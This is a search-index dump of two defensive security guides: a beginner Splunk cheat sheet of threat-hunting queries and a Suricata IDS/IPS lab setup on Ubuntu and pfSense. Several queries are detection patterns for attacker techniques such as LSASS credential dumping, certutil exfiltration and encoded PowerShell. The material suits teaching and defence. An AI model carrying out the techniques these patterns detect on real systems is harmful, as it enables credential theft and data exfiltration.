<li>https://youtu.be/uQUAvY5M3RU?si=JKk_M_60LLsvk0w6</li> <li>https://youtu.be/2kU1ZTAZphY?si=H3zP0QD9m8MmL2bG</li> </ul>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html","title":"Splunk Cheat Sheet","text":""},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#about-this-cheat-sheet","title":"About this Cheat Sheet","text":"<p>This cheat sheet is aimed at beginner-level users and covers common detection use cases and queries in Splunk. It\u2019s designed to help you get started with threat hunting and understand how to search for suspicious activity using log data.</p>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#note-on-indexes","title":"Note on Indexes:","text":"<p>The example queries use <code>index=windows</code>, but the actual index name in your environment may be different.</p> <p>If you are unsure, try running:</p> <pre><code>index=*\n</code></pre> <p>This will search across all indexes and help you identify the correct one. Once confirmed, update your queries accordingly.</p>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#authentication-access","title":"Authentication &amp; Access","text":""},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#successful-rdp-login","title":"Successful RDP Login","text":"<p>This looks for successful Remote Desktop (RDP) logins.</p> <p>Logon_Type=10 means the login came from a remote computer.</p> <p>You can track who logged in, from where, and when.</p> <pre><code>index=windows sourcetype=\"WinEventLog:Security\" EventCode=4624 Logon_Type=10\n| stats count by _time, user, host, src_ip\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#failed-logons-brute-force-detection","title":"Failed Logons (Brute-force Detection)","text":"<p>Finds users or IPs trying to log in multiple times and failing.</p> <p>If someone fails to log in over 5 times, it might be a brute-force attempt.</p> <pre><code>index=windows sourcetype=\"WinEventLog:Security\" EventCode=4625\n| stats count by user, src_ip, host\n| where count &gt; 5\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#pass-the-hash-or-lateral-movement","title":"Pass-the-Hash or Lateral Movement","text":"<p>Searches for logins that may come from other computers on the network.</p> <p>Logon_Type=3 is a network logon (e.g. file share), Logon_Type=9 is for using stored credentials.</p> <p>Useful for spotting movement between systems by attackers.</p> <pre><code>index=windows sourcetype=\"WinEventLog:Security\" EventCode=4624\n| search Logon_Type=3 OR Logon_Type=9\n| table _time, user, Logon_Type, src_ip, host\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#execution","title":"Execution","text":""},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#suspicious-process-creation-cmd-powershell","title":"Suspicious Process Creation (cmd, powershell)","text":"<p>Looks for command-line tools like PowerShell or cmd.exe being used.</p> <p>These tools are often abused by attackers to run scripts or commands silently.</p> <pre><code>index=windows source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1\n| search Image=\"*powershell.exe\" OR Image=\"*cmd.exe\"\n| stats count by user, host, Image, CommandLine\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#encoded-powershell-execution","title":"Encoded PowerShell Execution","text":"<p>Detects when PowerShell scripts are run with encoded commands.</p> <p>This is commonly used to hide what the script is really doing.</p> <pre><code>index=windows EventCode=4104\n| search Message=\"*EncodedCommand*\"\n| table _time, Message, host\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#uac-bypass-attempt","title":"UAC Bypass Attempt","text":"<p>Searches for command lines that mention \"bypass\".</p> <p>UAC (User Account Control) is a Windows security feature.</p> <p>Attackers try to bypass it to run admin-level commands without warning the user.</p> <pre><code>index=windows source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1\n| search CommandLine=\"*bypass*\"\n| table _time, host, Image, CommandLine\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#file-activity","title":"File Activity","text":""},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#file-drop-detection","title":"File Drop Detection","text":"<p>Tracks when files are created on the system.</p> <p>Useful for spotting malware being dropped in user folders.</p> <pre><code>index=windows source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=11\n| table _time, host, user, TargetFilename, Image\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#executable-run-from-temp-directory","title":"Executable Run from Temp Directory","text":"<p>Looks for programs being run from temporary folders.</p> <p>Legitimate software doesn\u2019t usually run from these locations which is a common red flag.</p> <pre><code>index=windows source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1\n| search Image=\"*\\\\AppData\\\\Local\\\\Temp\\\\*\" OR Image=\"*\\\\Temp\\\\*\"\n| table _time, Image, CommandLine, user, host\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#network-connections","title":"Network Connections","text":""},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#network-connections-sysmon","title":"Network Connections (Sysmon)","text":"<p>Shows what network connections are being made.</p> <p>Great for spotting suspicious outbound connections to strange IPs or ports.</p> <pre><code>index=windows source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=3\n| stats count by _time, SourceIp, DestinationIp, DestinationPort, host, Image\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#privilege-escalation-persistence","title":"Privilege Escalation &amp; Persistence","text":""},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#privilege-escalation-sedebugprivilege","title":"Privilege Escalation - SeDebugPrivilege","text":"<p>Detects when a user gets a special permission called SeDebugPrivilege.</p> <p>This allows someone to inspect or control other processes which is often abused by attackers.</p> <pre><code>index=windows sourcetype=\"WinEventLog:Security\" EventCode=4672\n| search privilege_list=\"SeDebugPrivilege\"\n| table _time, user, host, privilege_list\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#new-local-admin-account-created","title":"New Local Admin Account Created","text":"<p>Looks for new user accounts that are added to the Administrators group.</p> <p>Attackers often create their own admin users to keep access.</p> <pre><code>index=windows sourcetype=\"WinEventLog:Security\" EventCode=4720\n| search \"Account Name\"=\"*\" AND \"Account Domain\"=\"*Administrators*\"\n| table _time, host, \"Account Name\", user\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#registry-autoruns-modified","title":"Registry Autoruns Modified","text":"<p>Checks if anything was added to registry keys that auto-run programs on startup.</p> <p>A common way malware sets itself to run every time the computer boots.</p> <pre><code>index=windows source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=13 OR EventCode=14\n| search TargetObject=\"*\\\\Run\\\\*\" OR TargetObject=\"*\\\\RunOnce\\\\*\"\n| table _time, Image, TargetObject, host\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#remote-scheduled-task-created","title":"Remote Scheduled Task Created","text":"<p>Finds when someone creates a scheduled task remotely.</p> <p>Attackers use this to run malware or scripts at set times on target systems.</p> <pre><code>index=windows sourcetype=\"WinEventLog:Security\" EventCode=4698\n| table _time, user, host, TaskName, Command\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#lateral-movement-lolbas","title":"Lateral Movement &amp; LOLBAS","text":""},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#psexec-or-remote-admin-tool-usage","title":"PsExec or Remote Admin Tool Usage","text":"<p>Detects use of PsExec or similar tools that let someone run commands on another computer.</p> <p>Often used by IT staff or attackers once inside the network.</p> <pre><code>index=windows source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1\n| search Image=\"*psexec*\" OR CommandLine=\"*\\\\\\\\*\\\\\\\\ADMIN$*\"\n| table _time, user, host, CommandLine\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#living-off-the-land-binaries-lolbas","title":"Living Off The Land Binaries (LOLBAS)","text":"<p>Looks for built-in Windows programs like rundll32, regsvr32, and mshta being used.</p> <p>LOLBAS (Living Off the Land Binaries and Scripts) are legitimate tools abused by attackers to avoid detection.</p> <pre><code>index=windows source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1\n| search Image=\"*rundll32.exe\" OR Image=\"*regsvr32.exe\" OR Image=\"*mshta.exe\"\n| table _time, Image, CommandLine, user, host\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#anomaly-detection","title":"Anomaly Detection","text":""},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#rare-parent-child-process-pair","title":"Rare Parent-Child Process Pair","text":"<p>Finds uncommon combinations of parent and child processes.</p> <p>For example, if Notepad.exe launches PowerShell, that is suspicious.</p> <p>Low-frequency pairs often point to unusual activity worth checking out.</p> <pre><code>index=windows source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1\n| stats count by ParentImage, Image\n| where count &lt; 3\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#credential-access","title":"Credential Access","text":""},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#cleartext-passwords-in-command-line","title":"Cleartext Passwords in Command Line","text":"<p>Detects PowerShell or scripts that include the word \u201cpassword\u201d.</p> <p>Attackers sometimes use scripts that include credentials, especially during testing or automation.</p> <pre><code>index=windows EventCode=4104\n| search CommandLine=\"*password*\"\n| table _time, host, user, CommandLine\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#suspicious-access-to-lsass-process-mimikatz","title":"Suspicious Access to LSASS Process (Mimikatz)","text":"<p>Checks if a process is trying to access LSASS, which stores Windows credentials.</p> <p>Tools like Mimikatz do this to extract passwords from memory.</p> <pre><code>index=windows source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=10\n| search TargetImage=\"*lsass.exe\"\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#defense-evasion","title":"Defense Evasion","text":""},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#suspicious-dll-or-image-loaded","title":"Suspicious DLL or Image Loaded","text":"<p>Looks for programs loading DLLs from temporary or user folders.</p> <p>This is unusual for legitimate software and often used to hide malicious code.</p> <pre><code>index=windows source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=7\n| search ImageLoaded=\"*\\\\temp\\\\*\" OR ImageLoaded=\"*\\\\AppData\\\\*\"\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#exfiltration","title":"Exfiltration","text":""},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#unusual-data-transfer-tools-in-use","title":"Unusual Data Transfer Tools in Use","text":"<p>Detects signs of data being transferred or uploaded via tools like certutil.</p> <p>Attackers sometimes use built-in tools to send stolen data out.</p> <pre><code>index=windows EventCode=4104\n| search CommandLine=\"*certutil*\" OR CommandLine=\"*upload*\"\n</code></pre>"},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#phishing-or-document-based-attacks","title":"Phishing or Document-Based Attacks","text":""},{"location":"splunk-cheat-sheet/splunk-cheat-sheet.html#microsoft-word-launching-powershell","title":"Microsoft Word Launching PowerShell","text":"<p>Looks for suspicious process chains like Word starting PowerShell.</p> <p>This often means a malicious macro or document is being used in a phishing attack.</p> <pre><code>index=windows source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1\n| search ParentImage=\"*winword.exe\" AND Image=\"*powershell.exe\"\n</code></pre>"},{"location":"suricata/suricata.html","title":"Suricata","text":"<p>Suricata is an open-source network threat detection engine developed by the Open Information Security Foundation (OISF). It provides capabilities for real-time intrusion detection (IDS), inline intrusion prevention (IPS), network security monitoring (NSM), and offline packet capture (pcap) processing. </p>"},{"location":"suricata/suricata.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, instead of simulating attacks, the Windows host acted as a compromised machine where malicious websites were visited to trigger alerts in a safe and controlled setting.</p> Host OS Role IP Address pfsense FreeBSD (pfSense v2.7.2) Firewall/Router (Gateway IDS/IPS) 192.168.1.200 (WAN) / 10.0.0.2 (LAN) Suricata Ubuntu 22.04 LTS Host IDS/IPS 10.0.0.27 WS2019 Windows Server 2019 Compromised machine 10.0.0.24 <p></p>"},{"location":"suricata/suricata.html#install-suricata-on-host","title":"Install Suricata on Host","text":"<p>In this demonstration, we will be installing Suricata on the Ubuntu virtual machine. We will be simulating install in an air-gapped environment but note that some parts of the step requires internet connection.</p> <p>On a Ubuntu machine with internet access Add the necessary repository for Suricata:</p> <pre><code>sudo apt-get install software-properties-common\nsudo add-apt-repository ppa:oisf/suricata-stable\nsudo apt-get update\n</code></pre> <p>Create a directory to store Suricata. Adjust the directory permissions:</p> <pre><code>sudo mkdir ~/suricata-offline\ncd ~/suricata-offline\nsudo chmod 755 ~/suricata-offline\n</code></pre> <p>Download the Suricata package and all its dependencies:</p> <p>Download the Emerging Threats Open rule set:</p> <pre><code>sudo apt-get download suricata\nsudo wget https://rules.emergingthreats.net/open/suricata-7.0.6/emerging.rules.tar.gz\n</code></pre> <p>Create a directory to store dependencies. Adjust the directory permissions:</p> <pre><code>sudo mkdir dependencies\ncd dependencies\nsudo chmod 755 ~/suricata-offline/dependencies\n</code></pre> <p>Download the required dependencies</p> <pre><code>sudo apt-get download autoconf automake build-essential cargo cbindgen \\\n    libjansson-dev libpcap-dev libpcre2-dev libtool libyaml-dev make \\\n    pkg-config rustc zlib1g-dev libc6-dev gcc g++ dpkg-dev binutils \\\n    libpcre2-16-0 libpcre2-posix3 libdpkg-perl libstd-rust-dev libssh2-1 \\\n    libpcap0.8-dev m4 autotools-dev binutils-common libbinutils \\\n    binutils-x86-64-linux-gnu g++-11 gcc-11 libc-dev-bin linux-libc-dev \\\n    libcrypt-dev rpcsvc-proto libtirpc-dev libnsl-dev libdbus-1-dev \\\n    libstd-rust-1.75 libctf-nobfd0 libctf0 lto-disabled-list libstdc++-11-dev \\\n    libcc1-0 libgcc-11-dev libsigsegv2 libc6=2.35-0ubuntu3.8 libitm1 \\\n    libasan6 liblsan0 libtsan0 libubsan1 libquadmath0 \\\n    libevent-pthreads-2.1-7 libhiredis0.14 libhtp2 libhyperscan5 \\\n    libluajit-5.1-2 libnet1 libnetfilter-queue1 libluajit-5.1-common \\\n    liblzma-dev libevent-core-2.1-7 curl jq libcurl4=7.81.0-1ubuntu1.17 libjq1=1.6-2.1ubuntu3 libonig5 libc6-dbg libc6 zlib1g\n</code></pre> <p>Transfer suricata-offline folder to /opt directory in Ubuntu machine without internet access. </p> <p>Install dependencies and suricata</p> <pre><code>cd /opt/suricata-offline/dependencies\nsudo dpkg -i *\n</code></pre> <p>Install Suricata</p> <pre><code>cd /opt/suricata-offline/\nsudo dpkg -i suricata_1%3a7.0.6-0ubuntu2_amd64.deb\n</code></pre> <p>After installing Suricata, you can check which version of Suricata you have running and with what options, as well as the service state:</p> <p>Suricata is running in exited state, which typically indicates that the service started successfully and then exited without issues because it's running in IDS mode.</p> <pre><code>sudo suricata --build-info\nsudo systemctl status suricata\n</code></pre>"},{"location":"suricata/suricata.html#basic-setup","title":"Basic setup","text":"<p>First, determine the interface(s) and IP address(es) on which Suricata should be inspecting network packets:</p> <pre><code>ip a\n...\n2: ens32: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 00:0c:29:51:ef:1b brd ff:ff:ff:ff:ff:ff\n    altname enp2s0\n    inet 10.0.0.25/24 brd 10.0.0.255 scope global noprefixroute ens32\n</code></pre> <p>Use that information to configure Suricata:</p> <pre><code>sudo nano /etc/suricata/suricata.yaml\n</code></pre> <p>Specify internal network in the HOME_NET </p> <p>Specify network interface in af-packet and pcap.</p> <p>Set use-mmap to yes.</p> <p>Set community-id to true</p> <pre><code>vars:\n  # more specific is better for alert accuracy and performance\n  address-groups:\n    HOME_NET: \"[10.0.0.0/24]\"\n...\ncommunity-id: true\n...\naf-packet:\n    - interface: ens32\n      cluster-id: 99\n      cluster-type: cluster_flow\n      defrag: yes\n      use-mmap: yes\n...\n# Cross platform libpcap capture support\npcap:\n  - interface: ens32\n\n checksum-validation: no\n</code></pre>"},{"location":"suricata/suricata.html#suricata-update-offline","title":"Suricata-update offline","text":"<p>Run <code>suricata-update</code> to update rules and create /var/lib/suricata folder</p> <p>Note it is expected to get the error \u201cFailed to fetch https://rules.emergingthreats.net/open/suricata-7.0.6/emerging.rules.tar.gz:\u201d</p> <pre><code>sudo suricata-update\n</code></pre> <p>Make a folder called suricata-rules and extract <code>emerging.rules.tar.gz</code> to that directory</p> <pre><code>sudo mkdir suricata-rules\nsudo tar -xvzf emerging.rules.tar.gz -C /opt/suricata-offline/suricata-rules/\n</code></pre> <p>Append the rules from the file to the main /var/lib/suricata/rules/suricata.rules file</p> <pre><code>sudo bash -c 'find /opt/suricata-offline/suricata-rules/rules/ -name \"*.rules\" -exec cat {} + &gt;&gt; /var/lib/suricata/rules/suricata.rules'\n</code></pre>"},{"location":"suricata/suricata.html#suricata-update-online-recommended","title":"Suricata-update online (recommended)","text":"<p>Running suricata-update with internet connection simplifies the process of downloading and installing rulesets.</p> <pre><code>sudo suricata-update\n</code></pre> <p>You can also list sources and download rules from a specific source</p> <pre><code>sudo suricata-update list-sources\n</code></pre> <p>Summary of different license types:</p> <ul> <li>MIT is very permissive, allowing almost any use, even commercial.</li> <li>Commercial requires you to pay or subscribe for usage rights, often with strict terms.</li> <li>CC-BY-SA-4.0 requires you to give credit and share any modifications under the same license.</li> <li>GPL-3.0 requires sharing modifications under the same open-source license and offering the source code.</li> <li>Non-Commercial restricts usage to personal or non-commercial contexts.</li> </ul> <p>To download the ruleset from a specific source, run:</p> <p>If required, update sources</p> <pre><code>sudo suricata-update update-sources\nsudo suricata-update enable-source &lt;Name&gt;\nsudo suricata-update\n</code></pre> <p>Test Suricata configuration file by running</p> <pre><code>sudo suricata -T -c /etc/suricata/suricata.yaml -v\n</code></pre> <pre><code>#Example output\n\nNotice: suricata: This is Suricata version 7.0.6 RELEASE running in SYSTEM mode\nInfo: cpu: CPUs/cores online: 2\nInfo: suricata: Running suricata under test mode\nInfo: suricata: Setting engine mode to IDS mode by default\nInfo: exception-policy: master exception-policy set to: auto\nInfo: logopenfile: fast output device (regular) initialized: fast.log\nInfo: logopenfile: eve-log output device (regular) initialized: eve.json\nInfo: logopenfile: stats output device (regular) initialized: stats.log\nInfo: detect: 1 rule files processed. 39802 rules successfully loaded, 0 rules failed, 0\nInfo: threshold-config: Threshold config parsed: 0 rule(s) found\nInfo: detect: 39805 signatures processed. 1158 are IP-only rules, 4116 are inspecting packet payload, 34321 inspect application layer, 108 are decoder event only\nNotice: suricata: Configuration provided was successfully loaded. Exiting.\n</code></pre> <p>Note the difference in number of signatures processed, inspecting packet payload and inspect application layers when suricata-update was executed without internet access:</p> <pre><code>Info: detect: 39669 signatures processed. 1158 are IP-only rules, 4110 are inspecting packet payload, 34193 inspect application layer, 108 are decoder event only\nNotice: suricata: Configuration provided was successfully loaded. Exiting.\n</code></pre>"},{"location":"suricata/suricata.html#running-suricata","title":"Running Suricata","text":"<p>With the rules installed, Suricata can run properly and thus we restart it:</p> <pre><code>sudo systemctl restart suricata\n</code></pre> <p>To make sure Suricata is running check the Suricata log:</p> <pre><code>sudo tail /var/log/suricata/suricata.log\n</code></pre> <p>The last line will be similar to this:</p> <pre><code>5933 - Suricata-Main] 2024-09-12 13:26:11 Notice: threads: Threads created -&gt; W: 2 FM: 1 FR: 1   Engine started.\n</code></pre> <p>The actual thread count will depend on the system and the configuration.</p> <p>To see statistics, check the\u00a0<code>stats.log</code>\u00a0file:</p> <pre><code>sudo tail -f /var/log/suricata/stats.log\n</code></pre> <p>By default, it is updated every 8 seconds to show updated values with the current state, like how many packets have been processed and what type of traffic was decoded.</p>"},{"location":"suricata/suricata.html#alerting","title":"Alerting","text":"<p>To test the IDS functionality of Suricata it's best to test with a signature. The signature with ID\u00a0<code>2100498</code>\u00a0from the ET Open ruleset is written specific for such test cases.</p> <p>2100498:</p> <pre><code>alert ip any any -&gt; any any (msg:\"GPL ATTACK_RESPONSE id check returned root\"; content:\"uid=0|28|root|29|\"; classtype:bad-unknown; sid:2100498; rev:7; metadata:created_at 2010_09_23, updated_at 2010_09_23;)\n</code></pre> <p>The syntax and logic behind those signatures is covered in other chapters. This will alert on any IP traffic that has the content within its payload. This rule can be triggered quite easy. Before we trigger it, start\u00a0<code>tail</code>\u00a0to see updates to\u00a0<code>fast.log</code>.</p> <pre><code>curl http://testmynids.org/uid/index.html\nsudo tail /var/log/suricata/fast.log\n</code></pre> <p>The following output should now be seen in the log:</p> <pre><code>09/12/2024-13:51:32.520238  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.53:80 -&gt; 10.0.0.25:34606Alerts:\n</code></pre> <p>This should include the timestamp and the IP of your system.</p>"},{"location":"suricata/suricata.html#custom-rules","title":"Custom rules","text":"<p>Stop Suricata service:</p> <pre><code>sudo systemctl stop suricata\n</code></pre> <p>Create local.rules</p> <pre><code>sudo nano /usr/share/suricata/rules/local.rules\n</code></pre> <p>Write following rule to alert on ping to internal network (note syntax is very similar to Snort)</p> <pre><code>alert icmp any any -&gt; $HOME_NET any (msg: \"ICMP Ping Detected\"; sid:1; rev:1;)\n</code></pre> <p>Edit suricata.yml</p> <pre><code>sudo nano /etc/suricata/suricata.yaml \n</code></pre> <p>Add local.rules to rule-files</p> <pre><code>default-rule-path: /var/lib/suricata/rules\n\nrule-files:\n  - suricata.rules\n  - /usr/share/suricata/rules/local.rules\n</code></pre> <p>Test Suricata configuration:</p> <pre><code>sudo suricata -T -c /etc/suricata/suricata.yaml -v\n</code></pre> <p>Start Suricata and verify it is running and active. </p> <pre><code>sudo systemctl start suricata\nsudo systemctl status suricata\n</code></pre> <p>Execute ping to Suricata host from another host in internal network</p> <p>Verify that the alerts have been logged</p> <pre><code>sudo tail /var/log/suricata/fast.log\n</code></pre> <pre><code>09/12/2024-14:14:31.052314  [**] [1:1:1] ICMP Ping Detected [**] [Classification: (null)] [Priority: 3] {ICMP} 10.0.0.25:0 -&gt; 10.0.0.20:0\n09/12/2024-14:14:57.907164  [**] [1:1:1] ICMP Ping Detected [**] [Classification: (null)] [Priority: 3] {ICMP} 10.0.0.20:3 -&gt; 10.0.0.1:3\n</code></pre>"},{"location":"suricata/suricata.html#eve-json","title":"EVE JSON","text":"<p>The more advanced output is the EVE JSON output which is explained in detail in\u00a0Eve JSON Output. To see what this looks like it's recommended to use\u00a0<code>jq</code>\u00a0to parse the JSON output. Alerts:</p> <pre><code>sudo tail /var/log/suricata/eve.json | jq 'select(.event_type==\"alert\")'\n</code></pre> <p>This will display more detail about each alert with a better readability, including meta-data.</p> <pre><code>{\n  \"timestamp\": \"2024-09-12T14:21:18.932116+1200\",\n  \"flow_id\": 1750955545135946,\n  \"in_iface\": \"ens32\",\n  \"event_type\": \"alert\",\n  \"src_ip\": \"10.0.0.25\",\n  \"src_port\": 0,\n  \"dest_ip\": \"10.0.0.20\",\n  \"dest_port\": 0,\n  \"proto\": \"ICMP\",\n  \"icmp_type\": 0,\n  \"icmp_code\": 0,\n  \"pkt_src\": \"wire/pcap\",\n  \"community_id\": \"1:7Z0C1taw8mzKweAktDBR9AYDoBA=\",\n  \"alert\": {\n    \"action\": \"allowed\",\n    \"gid\": 1,\n    \"signature_id\": 1,\n    \"rev\": 1,\n    \"signature\": \"ICMP Ping Detected\",\n    \"category\": \"\",\n    \"severity\": 3\n  },\n  \"direction\": \"to_client\",\n  \"flow\": {\n    \"pkts_toserver\": 1,\n    \"pkts_toclient\": 1,\n    \"bytes_toserver\": 98,\n    \"bytes_toclient\": 98,\n    \"start\": \"2024-09-12T14:21:18.931964+1200\",\n    \"src_ip\": \"10.0.0.20\",\n    \"dest_ip\": \"10.0.0.25\"\n  }\n}\n</code></pre> <p>Stats:</p> <pre><code>sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type==\"stats\")|.stats.capture.kernel_packets'\nsudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type==\"stats\")'\n</code></pre> <p>The first example displays the number of packets captured by the kernel; the second examples shows all of the statistics.</p>"},{"location":"suricata/suricata.html#setting-up-ips-inline-for-linux","title":"Setting up IPS inline for Linux","text":""},{"location":"suricata/suricata.html#setting-up-ips-with-netfilter","title":"Setting up IPS with Netfilter","text":"<p>To check if you have NFQ enabled in your Suricata build, enter the following command:</p> <pre><code>suricata --build-info\n</code></pre> <p>and make sure that <code>NFQueue support: yes</code> is listed in the output.</p> <p>Edit local.rules to add a sample rule for IPS mode:</p> <pre><code>sudo nano /usr/share/suricata/rules/local.rules\n</code></pre> <pre><code>#IDS Mode\nalert icmp any any -&gt; $HOME_NET any (msg: \"ICMP Ping Detected\"; sid:1; rev:1;)\n\n#IPS Mode\ndrop icmp any any -&gt; 1.1.1.1 any (msg:\"ICMP Detected and Blocked to 1.1.1.1\"; sid:2; rev:1;)\n</code></pre> <p>Run Suricata with the NFQ mode and use the\u00a0<code>-q</code>\u00a0option. This option tells Suricata which queue numbers it should use.</p> <pre><code>sudo suricata -c /etc/suricata/suricata.yaml -q 0\n</code></pre> <p>In this scenario, you are sending traffic that is generated by your computer to Suricata. Run:</p> <pre><code>sudo iptables -I INPUT -j NFQUEUE\nsudo iptables -I OUTPUT -j NFQUEUE\n</code></pre> <p>If Suricata is installed on the gateway (e.g. Firewall), you can send traffic that passes through Suricata by running:</p> <pre><code>sudo iptables -I FORWARD -j NFQUEUE\n</code></pre> <p>Execute <code>ping 1.1.1.1</code> and check Suricata alerts:</p> <pre><code>ping 1.1.1.1\ntail -f /var/log/suricata/fast.log\n</code></pre> <pre><code>09/14/2024-16:11:08.050136  [Drop] [**] [1:2:1] ICMP Detected and Blocked to 1.1.1.1 [**] [Classification: (null)] [Priority: 3] {ICMP} 10.0.0.27:8 -&gt; 1.1.1.1:0\n</code></pre> <p>To see if you have set your\u00a0<code>iptables</code>\u00a0rules correct make sure Suricata is running and enter:</p> <pre><code>sudo iptables -vnL\n</code></pre> <p>In the example you can see if packets are being logged.</p> <pre><code>Chain INPUT (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n 1032 1101K NFQUEUE    all  --  *      *       0.0.0.0/0            0.0.0.0/0            NFQUEUE num 0\n\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n\nChain OUTPUT (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n 1469  126K NFQUEUE    all  --  *      *       0.0.0.0/0            0.0.0.0/0            NFQUEUE num 0\n</code></pre>"},{"location":"suricata/suricata.html#install-suricata-on-gateway","title":"Install Suricata on Gateway","text":"<p>While Suricata can be installed on a host, it can also be installed on a gateway such as pfSense. The pfSense\u00a0is a free and open source firewall and router. For installing and configuring pfSense, refer to pfSense documentation and instruction video. pfSense can be downloaded from here.</p> <p>Full demonstration video on configuring Suricata on pfSense can be found here. </p> <p>After competing basic configuration on pfSense, navigate to System &gt; Package Manager &gt; Available Packages on pfSense web UI.</p> <p>Search for <code>suricata</code> and click install (confirm when prompted). Internet connection is required.</p> <p></p> <p></p> <p>Once install is complete, navigate to Services &gt; Suricata &gt; Global Settings.</p> <p>Select Install ETOpen Emerging Threats rules, Install Feodo Tracker Botnet C2 IP rules and Install ABUSE.ch SSL Blacklist rules.</p> <p></p> <p>Select 1 Day for Update Interval and select Live Rule Swap on Update.</p> <p></p> <p>Leave rest of settings default and click save.</p> <p>Navigate to Update section and click Update.</p> <p></p> <p>Once rule set update is complete, you will see timestamps of recent update.</p> <p></p> <p>Navigate to Interfaces section and click Add.</p> <p></p> <p>Select interface to run Suricata. In this demonstration, Suricata is installed on the LAN interface.</p> <p></p> <p>For the EVE Output Settings, select EVE JSON Log and Output Type as FILE. Leave rest of the settings as default values and click Save.</p> <p></p> <p>Within the Interface section, navigate to LAN Categories and Select All rulesets and click Save.</p> <p>You can read about each rule in the LAN Rules section and enable certain rule instead of enabling all rules. Pointproof documentation explains about the emerging rules. </p> <p></p> <p>On pfSense VM, selection option 8 for shell and run <code>top -s 1</code> to monitor CPU</p> <pre><code>top -s 1\n</code></pre> <p></p> <p>Navigate back to Interfaces section and run Suricata by clicking the play button.</p> <p></p> <p>After a while, you will see a green tick box on Suricata Status, but CPU usage is still at 99%. Wait until CPU usage drops below 30% of pfSense VM CLI.</p> <p></p> <p>Navigate to the Alerts tab, and verify that there are no alerts.</p> <p></p>"},{"location":"suricata/suricata.html#testing-ids","title":"Testing IDS","text":"<p>Suricata by default generates alert when a user access .to domain. From the Windows host connected to pfSense on an internal network, navigate to https://amzn.to/3xPjJbS on a web browser.</p> <p>Note that the alerts have been generated but these are false positives.</p> <p></p>"},{"location":"suricata/suricata.html#finetuning-rules-to-reduce-false-positives","title":"Finetuning rules to reduce false positives","text":"<p>Copy GID:SID <code>1:2027757</code> . Navigate to SID Mgmt tab, select Enable Automatic SID State Management. Edit the disablesid-sample.conf</p> <p></p> <p>Edit the List Name as LAN-Disabled. Delete the existing content and copy and paste the following:</p> <pre><code>#ET DNS Query for .to TLD\n1:2027757\n</code></pre> <p></p> <p>Repeat the same process for dropsid-sample.conf and enablesid-sample.conf. Change the List Name of dropsid-sample.conf to LAN-Drops and enablesid-sample.conf to LAN-Enabled. Make sure they each have nothing in the content.</p> <p>For Interface SID Management List Assignments, select Rebuild. Select LAN-Enabled for Enable SID List, LAN-Disabled for Disable SID List.</p> <p></p> <p>Navigate back to Alerts tab and clear alerts</p> <p></p> <p>From the Windows host connected to pfSense on an internal network. Wait for CPU percentage to drop. Navigate to https://amzn.to/3xPjJbS on a web browser. 